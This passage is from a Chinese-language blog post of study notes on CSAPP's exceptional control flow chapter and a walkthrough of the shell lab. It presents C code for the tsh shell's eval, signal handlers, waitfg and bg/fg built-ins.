class="built_in">Signal</span>(SIGCHLD, handler);</span><br><span class="line">    <span class="built_in">initjobs</span>();<span class="comment">/*Initialize the job list */</span></span><br><span class="line">     <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((pid = <span class="built_in">Fork</span>()) == <span class="number">0</span>) <span class="comment">/*Child process*/</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Execve</span>(<span class="string">&quot;/bin/date&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">Sigprocmask</span>(SIG_BLOCK, &amp;mask_all, &amp;prev_all);<span class="comment">/*Parent process */</span> </span><br><span class="line">        <span class="built_in">addjob</span>(pid);<span class="comment">/*Add the child to the job list */</span></span><br><span class="line">         <span class="built_in">Sigprocmask</span>(SIG_SETMASK, &amp;prev _all, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在子进程中，程序执行 <code>Execve(&quot;/bin/date&quot;, argv, NULL);</code> 来替换当前进程的映像为 <code>/bin/date</code>，并执行 <code>date</code> 命令。如果 <code>Execve</code> 成功，子进程将不会返回执行 <code>while (1)</code> 循环，因为它已经被 <code>date</code> 命令替换了。</p>
<p>在父进程中，<code>Fork()</code> 返回子进程的PID，随后父进程会阻塞所有信号（通过 <code>Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</code>），将子进程PID添加到作业列表（通过调用 <code>addjob(pid);</code>），然后恢复之前的信号掩码（通过 <code>Sigprocmask(SIG_SETMASK, &amp;prev_all, NULL);</code>）。</p>
<h2 id="8-6-nonlocal-jump"><a href="#8-6-nonlocal-jump" class="headerlink" title="8.6 nonlocal jump"></a>8.6 nonlocal jump</h2><p>setjmp:调用一次，返回多次。</p>
<p>longjmp：调用一次，从不返回。（execve也是调用一次，从不返回，习题8.10）</p>
<p>能够从深层的函数嵌套中返回，不用一层一层的解开调用栈，所以他不是很安全，有点像goto类型语句</p>
<h2 id="8-7-Some-Tools"><a href="#8-7-Some-Tools" class="headerlink" title="8.7 Some Tools"></a>8.7 Some Tools</h2><p>STRACE: 打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。对于好奇的学生而言，这是一个令人着迷的工具。用 -static 编译你的程序，能得到一个更干净的、不带有大量与共享库相关的输出的轨迹。<br>PS: 列出当前系统中的进程（包括僵死进程）。<br>TOP: 打印出关千当前进程资源使用的信息。<br>PMAP: 显示进程的内存映射。</p>
<h1 id="辅助资料"><a href="#辅助资料" class="headerlink" title="辅助资料"></a>辅助资料</h1><p><a href="https://www.bilibili.com/video/BV1iW411d7hd">Lecture 14 Exceptional Control Flow Exceptions and Processes</a></p>
<p><a href="https://www.bilibili.com/video/BV1iW411d7hd">Lecture 15 Exceptional Control Flow Signals and Nonlocal Jumps</a></p>
<p><a href="https://wdxtub.com/csapp/thin-csapp-5/2016/04/16/">【读薄 CSAPP】伍 异常控制流</a></p>
<p><a href="https://fengmuzi2003.gitbook.io/csapp3e/di-08-zhang-yi-chang-kong-zhi-liu">第08章：异常控制流 | CSAPP重点解读 (gitbook.io)</a></p>
<p><a href="http://csapp.cs.cmu.edu/3e/shlab.pdf">shlab.dvi (cmu.edu)</a></p>
<h1 id="Lab前瞻"><a href="#Lab前瞻" class="headerlink" title="Lab前瞻"></a>Lab前瞻</h1><h2 id="Topic"><a href="#Topic" class="headerlink" title="Topic"></a>Topic</h2><blockquote>
<p>• eval: Main routine that parses and interprets the command line. [70 lines]</p>
<p>• builtin cmd: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. [25 lines]</p>
<p>• do bgfg: Implements the bg and fg built-in commands. [50 lines]</p>
<p>• waitfg: Waits for a foreground job to complete. [20 lines]</p>
<p>• sigchld handler: Catches SIGCHILD signals. 80 lines]</p>
<p>• sigint handler: Catches SIGINT (ctrl-c) signals. [15 lines]</p>
<p>• sigtstp handler: Catches SIGTSTP (ctrl-z) signals. [15 lines]</p>
</blockquote>
<p>补全上面的函数，括号中的lines表示预计lines，补全完后make就行</p>
<h2 id="The-tsh-Speciﬁcation"><a href="#The-tsh-Speciﬁcation" class="headerlink" title="The tsh Speciﬁcation"></a>The tsh Speciﬁcation</h2><blockquote>
<p>Your tsh shell should have the following features:</p>
<p>• The prompt should be the string “tsh&gt; ”.</p>
<p>• The command line typed by the user should consist of a name and zero or more arguments, all separated by one or more spaces. If name is a built-in command, then tsh should handle it immediately and wait for the next command line. Otherwise, tsh should assume that name is the path of an executable ﬁle, which it loads and runs in the context of an initial child process (In this context, the term job refers to this initial child process).</p>
<p>• tsh need not support pipes (|) or I&#x2F;O redirection (&lt; and &gt;).</p>
<p>• Typing ctrl-c (ctrl-z) should cause a SIGINT (SIGTSTP) signal to be sent to the current foreground job, as well as any descendents of that job (e.g., any child processes that it forked). If there is no foreground job, then the signal should have no effect.</p>
<p>• If the command line ends with an ampersand &amp;, then tsh should run the job in the background.</p>
<p>Otherwise, it should run the job in the foreground.</p>
<p>• Each job can be identiﬁed by either a process ID (PID) or a job ID (JID), which is a positive integer assigned by tsh. JIDs should be denoted on the command line by the preﬁx ’%’. For example, “%5” denotes JID 5, and “5” denotes PID 5. (We have provided you with all of the routines you need for manipulating the job list.)</p>
<p>• tsh should support the following built-in commands:</p>
<p>– The quit command terminates the shell.</p>
<p>– The jobs command lists all background jobs.</p>
<p>– The bg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the background. The <job> argument can be either a PID or a JID.</p>
<p>– The fg <job> command restarts <job> by sending it a SIGCONT signal, and then runs it in the foreground. The <job> argument can be either a PID or a JID.</p>
<p>• tsh should reap all of its zombie children. If any job terminates because it receives a signal that it didn’t catch, then tsh should recognize this event and print a message with the job’s PID and a description of the offending signal.</p>
</blockquote>
<p>用人话讲就是：</p>
<ul>
<li>每次要以<code>tsh&gt;</code>开始,这个prompt他会提前提供给你</li>
<li>每次命令行只有两种类别可能性，一种是内置命令要运行builtin_cmd函数处理quit，jobs，bg和fg命令，同时不用处理单独的<code>&amp;</code>命令，一种是运行程序，使用exevc函数+参数</li>
<li>不需要管道和I&#x2F;O</li>
<li>ctrl-c和ctrl-z只对前台进程fg管用，分别是对前台进程进行终止和挂起，即为stoped和terminaled</li>
<li>如果命令以<code>&amp;</code>结尾，则默认是后台进程</li>
<li>要有JID和PID的区分，jid为一个组的id，而pid则是每个进程的id</li>
<li>需要支持以下内置命令<ol>
<li>quit：关闭结束shell</li>
<li>jobs：列出所有后台任务</li>
<li>bg</li>
<li>fg</li>
</ol>
</li>
<li>tsh 应该回收所有的僵尸进程，如果任何 job 因为接收了没有 catch 的信号而终止，tsh 应该识别出这个时间并且打印出 JID 和相关信号的信息</li>
</ul>
<blockquote>
<p>做这个lab的时候已经离读完本章过了七八天了，好像又忘得差不多了，真的很烦拉锯战。现在已经很多代码都看不懂了</p>
</blockquote>
<h1 id="Lab摸索"><a href="#Lab摸索" class="headerlink" title="Lab摸索"></a>Lab摸索</h1><p>我们归根结底是要对<code>tsh.c</code>这个文件进行修改，让他起到一个shell的作用，我们只用不全eval那几个函数，一开始我们运行下tsh，输入<code>./tsh</code>会进入死循环，每次键入没有反应，阅读代码得知<code>ctrl-d</code>能结束程序。而tshref便是模范程序，tshref.out便是模范输出，我们照着trace文件序号从小到大一个一个实现就可以了，开工！</p>
<h2 id="错误处理包装函数"><a href="#错误处理包装函数" class="headerlink" title="错误处理包装函数"></a>错误处理包装函数</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pid_t</span> <span class="title function_">Fork</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> environ[])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> signum)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigemptyset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> signum)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Setpgid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">pid_t</span> pgid)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Sigsuspend</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> <span class="title function_">Fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">if</span>((pid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Fork error&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> environ[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (execve(filename, argv, environ) &lt; <span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Kill</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> signum)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(kill(pid, signum) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Kill error&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigemptyset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigemptyset(<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigemptyset error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigaddset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">int</span> sign)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigaddset(<span class="built_in">set</span>, sign) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigaddset error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigprocmask</span><span class="params">(<span class="type">int</span> how, <span class="type">sigset_t</span> *<span class="built_in">set</span>, <span class="type">sigset_t</span> *oldset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigprocmask(how, <span class="built_in">set</span>, oldset) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigprocmask error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Sigfillset</span><span class="params">(<span class="type">sigset_t</span> *<span class="built_in">set</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(sigfillset(<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigfillset error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Setpgid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">pid_t</span> pgid)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (setpgid(pid, pgid) &lt; <span class="number">0</span>)</span><br><span class="line">        unix_error(<span class="string">&quot;Setpgid error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">Sigsuspend</span><span class="params">(<span class="type">const</span> <span class="type">sigset_t</span> *<span class="built_in">set</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> rc = sigsuspend(<span class="built_in">set</span>); <span class="comment">/* always returns -1 */</span></span><br><span class="line">    <span class="keyword">if</span> (errno != EINTR)</span><br><span class="line">        unix_error(<span class="string">&quot;Sigsuspend error&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="信号处理"><a href="#信号处理" class="headerlink" title="信号处理"></a>信号处理</h2><h3 id="SIGCHLD-handler"><a href="#SIGCHLD-handler" class="headerlink" title="SIGCHLD_handler"></a>SIGCHLD_handler</h3><p>在这个函数里面我们要处理<code>SIGCHLD</code>这个信号</p>
<blockquote>
<p>sigchld_handler - 每当子作业终止（变成僵尸）或因收到 SIGSTOP 或 SIGTSTP 信号而停止时，内核都会向 shell 发送 SIGCHLD。处理程序会获取所有可用的僵尸子级，但不会等待任何其他当前正在运行的子级终止。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigchld_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> olderrno=errno;<span class="comment">//负责保存错误信息，errno是全局变量</span></span><br><span class="line">    <span class="type">sigset_t</span> mask_all,prev_all;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    sigfillset(&amp;mask_all);<span class="comment">//阻塞所有信号</span></span><br><span class="line">    <span class="keyword">while</span>((pid=waitpid(<span class="number">-1</span>,&amp;status,WNOHANG|WUNTRACED))&gt;<span class="number">0</span>)&#123;<span class="comment">//当有进程终止/停止的时候都会获得那个进程的pid</span></span><br><span class="line">        sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">      <span class="comment">//分别通过三种状态来判断是正常结束还是terminated还是stopped</span></span><br><span class="line">       <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">        deletejob(jobs,pid);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">        deletejob(jobs,pid);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span>(WIFSTOPPED(status))&#123;</span><br><span class="line">         <span class="built_in">printf</span> (<span class="string">&quot;Job [%d] (%d) stoped by signal %d\n&quot;</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">            job = getjobpid(jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">       &#125;</span><br><span class="line">       sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);<span class="comment">//解除所有阻塞</span></span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    errno=olderrno;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SIGINT-handler"><a href="#SIGINT-handler" class="headerlink" title="SIGINT_handler"></a>SIGINT_handler</h3><p>当接收到这个信号时，需要对所有在前台运行的进程将其状态变为STOP，通过kill函数来实现,即通过fgpid函数得到当前jobs中在前台的job的pid，然后把这个进程组kill掉，write_up中告诉我们使用kill函数时要用<code>-pid</code>来kill掉一整个进程组</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> olderrno=errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all,prev_all;</span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">    <span class="keyword">if</span>((pid=(<span class="built_in">fgpid</span>(jobs)))!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">kill</span>(-pid,SIGINT);</span><br><span class="line">    &#125;</span><br><span class="line">    errno=olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SIGTSTP-handler"><a href="#SIGTSTP-handler" class="headerlink" title="SIGTSTP_handler"></a>SIGTSTP_handler</h3><p>这个和接受到sigint信号的函数差别不大</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="type">int</span> olderrno=errno;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all,prev_all;</span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">    <span class="keyword">if</span>((pid=(<span class="built_in">fgpid</span>(jobs)))&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">kill</span>(-pid,SIGTSTP);</span><br><span class="line">    &#125;</span><br><span class="line">    errno=olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="waitfg"><a href="#waitfg" class="headerlink" title="waitfg"></a>waitfg</h2><p>阻塞所有的进程，直到前台进程结束&#x2F;被终止&#x2F;停止</p>
<p>用<code>sigsuspend</code>函数，这个函数相当于如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sigprocmask(SIG_SETMASK, &amp;mask, &amp;prev);</span><br><span class="line">pause();</span><br><span class="line">sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>在调用<code>sigsuspend</code>之前阻塞 SIGCHLD 信号，调用时又通过<code>sigprocmask</code>函数，在执行<code>pause</code>函数之前解除对信号的阻塞，从而正常休眠。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">waitfg</span><span class="params">(<span class="type">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="type">sigset_t</span> mask;</span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fgpid</span>(jobs)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">sigsuspend</span>(&amp;mask);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>总函数，贯穿对cmdline命令处理的调控，安排</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">eval</span><span class="params">(<span class="type">char</span> *cmdline)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//主线程，负责调控诸多函数</span></span><br><span class="line">    <span class="type">char</span> *argv[MAXARGS];</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">int</span> bg ;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">sigset_t</span> mask_all,prev_all,mask_one;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//阻塞信号</span></span><br><span class="line">    <span class="built_in">sigfillset</span>(&amp;mask_all);</span><br><span class="line">    <span class="built_in">sigemptyset</span>(&amp;mask_one);</span><br><span class="line">    <span class="built_in">sigaddset</span>(&amp;mask_one,SIGCHLD);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">sigprocmask</span>(SIG_BLOCK,&amp;mask_all,&amp;prev_all);<span class="comment">//防止出现子进程比父进程先的情况</span></span><br><span class="line">    <span class="comment">//在课本里有</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,cmdline);<span class="comment">//cmdline复制过来</span></span><br><span class="line">    bg=<span class="built_in">parseline</span>(buf,argv);<span class="comment">//负责根据空格把buf中的字符划分丢到argv的数组中</span></span><br><span class="line">    <span class="comment">//bg=1 则在后台执行</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">0</span>]==<span class="literal">NULL</span>)<span class="keyword">return</span> ;<span class="comment">//没有命令，不处理</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">builtin_cmd</span>(argv)) &#123;<span class="comment">//如果不是builtin_cmd，则创立新的子进程</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>((pid=fork())==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">setpgid</span>(<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//进程组</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">execve</span>(argv[<span class="number">0</span>],argv,environ)&lt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: Command not found.\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//注意子进程不继承父进程的局部变量，故下面的函数段在子进程中直接判定为假。</span></span><br><span class="line">       <span class="comment">//父进程</span></span><br><span class="line">        <span class="keyword">if</span>(!bg)&#123;<span class="comment">//前台执行</span></span><br><span class="line">            <span class="built_in">addjob</span>(jobs,pid,FG,cmdline);</span><br><span class="line">          <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;mask_one,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">waitfg</span>(pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;<span class="comment">//后台执行</span></span><br><span class="line">            <span class="built_in">addjob</span>(jobs,pid,BG,cmdline);</span><br><span class="line">            <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;mask_one,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>,<span class="built_in">pid2jid</span>(pid),pid,cmdline);</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sigprocmask</span>(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">return</span> ;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="builtin-cmd"><a href="#builtin-cmd" class="headerlink" title="builtin_cmd"></a>builtin_cmd</h2><p>这个很简单，就判断是不是那四个内置命令，是的话就调用对应的函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;quit&quot;</span>))</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;&amp;&quot;</span>))</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>)||!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;fg&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">do_bgfg</span>(argv);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;jobs&quot;</span>))&#123;</span><br><span class="line">    <span class="built_in">listjobs</span>(jobs);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="do-bgfg"><a href="#do-bgfg" class="headerlink" title="do_bgfg"></a>do_bgfg</h2><ul>
<li><p>The bg <job> command restarts <job> by sending it a SIGCONT signal,<br>and then runs it in the background.<br>The <job> argument can be either a PID or a JID.</p>
</li>
<li><p>The fg <job> command restarts <job> by sending it a SIGCONT signal,<br>and then runs it in the foreground. </p>
</li>
<li><p>The <job> argument can be either a PID or a JID.</p>
<p>这个函数主要是根据test14案例进行修改补充</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//后台执行</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span> *job=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> state;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>],<span class="string">&quot;bg&quot;</span>))state=BG;</span><br><span class="line">    <span class="keyword">else</span> state =FG;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(argv[<span class="number">1</span>]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;<span class="comment">//判断是不是只有fg/bg这种命令</span></span><br><span class="line">    <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>]==<span class="string">&#x27;%&#x27;</span>)&#123;<span class="comment">//jid的情况</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">sscanf</span>(&amp;argv[<span class="number">1</span>][<span class="number">1</span>],<span class="string">&quot;%d&quot;</span>,&amp;id)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            job=<span class="built_in">getjobjid</span>(jobs,id);</span><br><span class="line">            <span class="keyword">if</span>(job==<span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>,argv[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>])) &#123;  <span class="comment">//其它符号，非法输入，不是数字的情况</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//pid的情况，直接把字符串转化成数字床，通过atoi函数</span></span><br><span class="line">        id=<span class="built_in">atoi</span>(argv[<span 